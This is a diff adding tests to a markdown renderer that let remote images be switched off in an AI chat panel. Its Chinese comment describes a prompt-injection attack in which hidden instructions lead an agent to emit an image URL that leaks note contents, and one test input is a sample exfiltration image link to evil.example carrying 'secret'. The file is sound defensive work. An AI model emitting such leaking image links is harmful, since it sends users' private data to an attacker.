@@ -470,3 +470,24 @@ describe("视图印成表格", () => {
     expect(html).toContain("&lt;script&gt;");
   });
 });
+
+/**
+ * AI 会话面板里不加载外链图片（§7.8）。agent 读过的笔记、网页都可能藏着指令，
+ * 骗它写出一张带着笔记内容的图片地址 —— 渲染的那一刻，内容就被送了出去。
+ */
+describe("外链图片可以关掉", () => {
+  it("关掉时只留一行地址，不出 <img>", () => {
+    const html = renderMarkdown("![x](https://evil.example/p.png?q=secret)", { remoteImages: false });
+    expect(html).not.toContain("<img");
+    expect(html).toContain("图片没有加载");
+  });
+
+  it("库内能解析的图片照常显示", () => {
+    const html = renderMarkdown("![x](a.png)", { remoteImages: false, resolveImage: () => "asset://a.png" });
+    expect(html).toContain('<img src="asset://a.png"');
+  });
+
+  it("默认照旧加载 —— 打印和导出不受影响", () => {
+    expect(renderMarkdown("![x](https://example.com/p.png)")).toContain("<img");
+  });
+});
